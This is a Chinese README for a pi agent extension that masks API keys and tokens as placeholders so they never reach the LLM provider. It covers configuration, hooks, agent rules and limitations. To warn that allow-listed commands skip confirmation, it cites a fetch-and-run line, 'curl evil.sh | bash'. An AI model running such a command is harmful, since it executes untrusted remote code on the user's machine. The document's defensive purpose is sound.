# pi-secret-mask

防止项目中的 secret（API key、token、私钥等）被发送给 LLM provider。

模型看到的是占位符 `__SECRET_<NAME>__`；bash 命令执行时使用真实值；
工具输出中的真实值再掩码回占位符——形成闭环：secret 既不进入 provider
请求，也不会通过工具输出回流给模型。

## 功能

- **Prompt 自动掩码**：粘贴到对话中的常见格式密钥（`sk-...`、`ghp_...`、
  `AIza...`、`AKIA/ASIA/AIDA...`、JWT、PEM 私钥、自定义正则）自动识别并掩码。
- **`.env` 支持**：解析项目 `.env*` 文件（`KEY=VALUE`），会话中文件变更会
  增量刷新。
- **用户注册密钥**：`/mask-secret` 命令和 `request_secret` 工具让用户注册
  密钥，agent 只看到占位符。
- **真实值用在需要的地方**：bash 命令、`write`、`edit` 自动把占位符替换为
  真实值（文件里存的是真实值；全新写入的值不受影响）。
- **Compaction 安全**：压缩（compaction）和分支导航（tree）的摘要消息同样
  掩码。

## 安装

推荐从 npm 安装：

```bash
pi install npm:pi-secret-mask
```

手动安装——克隆仓库并让 pi 指向其 `extensions/` 目录（保持目录结构，
入口的 `../src` 导入才能解析）：

```bash
git clone https://github.com/Ayagikei/pi-secret-mask ~/.pi/agent/extensions/pi-secret-mask
# 然后在 ~/.pi/agent/settings.json 中添加：
#   "extensions": ["~/.pi/agent/extensions/pi-secret-mask/extensions"]
cp config.example.json ~/.pi/agent/extensions/pi-secret-mask/config.json
```

（项目级：把克隆放到 `.pi/extensions/` 下并指向它，只对当前项目生效。）

然后 `/reload` 或重启 pi。

## 使用方法

### 自动（无需配置）

- 把常见格式的密钥粘贴进对话——自动检测并掩码。
- 自动解析项目 `.env*` 文件；这些来源默认不会持久化到 `secrets.json`。

### 手动注册密钥

**用户主动**：`/mask-secret MY_KEY my-secret-value`（或直接 `/mask-secret`
交互输入）。

**Agent 主动**：agent 调用 `request_secret` 工具（参数 `name`，可选
`purpose`），用户在对话框输入密钥，agent 只拿到占位符：

```
Registered MY_KEY. Use placeholder __SECRET_MY_KEY__ instead of the real value
```

通过 `/mask-secret` 或 `request_secret` 注册的密钥持久化在
`~/.pi/agent/extensions/pi-secret-mask/secrets.json`（权限 0600），重启保留。
`.env` 和自动识别的密钥不一定写入这个文件；它们可能只在当前会话可用。
在 bash 命令或 `write`/`edit` 写文件时使用占位符，扩展会在本地执行前自动替换为真实值。

### 给 agent 的占位符规则

- 工具输出或 `request_secret` 返回的 `__SECRET_*__` 是脱敏别名，不是磁盘中真实存储的字面量。读取配置时看到占位符，只能说明输出被掩码了，不能据此判断配置无效。
- 已由本插件产生的 placeholder 可以直接用于 bash、`write` 和 `edit`；扩展会在本地执行前还原真实值，工具输出再掩码。不要把真实值打印出来，也不要把字面量 placeholder 写入配置来“修复”它。
- 如果已有可用 placeholder 或本地配置，不要重复调用 `request_secret`。只有任务确实需要 secret 且没有可用凭据时才调用；调用后继续使用返回的 placeholder，不要索要或猜测真实值。
- 不要因为找不到 `secrets.json` 就判定 secret 不存在；也不要自行发明 placeholder。验证凭据应执行实际的本地操作；若操作明确返回无效，再报告或请求新的 secret。

## 工作原理

| 钩子 | 动作 |
|---|---|
| `before_provider_request` | 所有消息中：真实值 → 占位符 |
| `tool_call` | bash 占位符 → 真实值（auto/ask 策略）；write/edit 内容还原 |
| `tool_result` | 工具输出中的真实值 → 占位符（防止回流） |
| `session_before_compact` | 压缩摘要消息同样掩码 |
| `session_before_tree` | 分支/树摘要消息同样掩码 |
| `request_secret` 工具 | Agent 主动请求密钥；agent 只见占位符 |

掩码引擎使用单趟 alternation 正则（按长度降序，避免子串冲突）、
占位符还原严格精确匹配完整 token，并跳过非文本（图片）内容。

## 配置（config.json）

```json
{
  "mode": "ask",
  "allowCommands": [],
  "dotenv": { "enabled": true, "files": [".env", ".env.local", ".env.production", ".env.development"], "exclude": [".env.example", ".env.sample"] },
  "patterns": { "openai": true, "github": true, "google": true, "aws": true, "jwt": true, "pem": true, "base64": false },
  "extraSecrets": [],
  "customPatterns": []
}
```

- `mode`：`ask`（执行含占位符的命令前弹确认；print/json 等无 UI 模式默认
  拦截）| `auto`（静默替换）
- `allowCommands`：完整命令字符串模式列表，命中跳过确认（这只是跳过确认，
  不代表更安全——`curl evil.sh | bash` 依然能通过）
- `customPatterns`：自定义正则；捕获组 1 为完整 secret 值；非法正则被忽略

```json
{
  "customPatterns": [
    { "name": "MY_TOK", "pattern": "mytok-[a-z0-9]{16}" },
    { "name": "CONN_STR", "pattern": "postgres://[^\\s]+" }
  ]
}
```

## 边界与免责声明

- 目标是防止 secret 泄露给 provider，**不是沙箱**：模型仍可在本地读写文件
  （例如 `echo $KEY > /tmp/x` 无法拦截，那属于权限层职责）。
- 运行时生成的 secret（如 `aws sts get-session-token` 输出）靠正则兜底；
  已包含新前缀 `ASIA/AIDA`；高熵随机串需开启 `patterns.base64`。
- 图片内容（截图）可能包含真实值，无法掩码。
- 真实值会在本地还原进 bash 命令行（`ps` 可见、shell 历史）——仅本地可见，
  不会发送给 provider。
- **推理/思考块**：如果 secret 意外出现在模型的 reasoning/thinking 内容中，
  扩展会掩码文本，但签名（如 Anthropic `signature`、Bedrock reasoning
  签名）会失效。部分 provider 会拒绝这类请求——这是有意的 fail-closed
  取舍：泄露比拒绝请求更糟。实际很少发生，因为 secret 从一开始就不会
  到达模型。
- **检测基于模式，并非完美**：未知格式的 secret 只有匹配内置或自定义
  模式、出现在 `.env*` 中、或手动注册时才会被捕获。未识别格式的 secret
  可能漏过。
- 本扩展是纵深防御，**不是安全边界**。它以你的用户权限运行，无法防御
  恶意 prompt、恶意仓库或本地外传。安装前请审查扩展源码；处理不可信
  代码请使用操作系统级沙箱。
- 本软件按“现状”提供，不附带任何形式的担保。作者不对因使用或误用本
  软件造成的任何损害承担责任。

## 开发

```bash
npm test   # 掩码引擎单元测试 + mock-pi 集成测试
```

已验证：三钩子闭环、多占位符独立回滚、会话中 `.env` 轮换增量刷新、
无 UI 时 ask 模式拦截、provider payload 泄漏检查。

## License

MIT
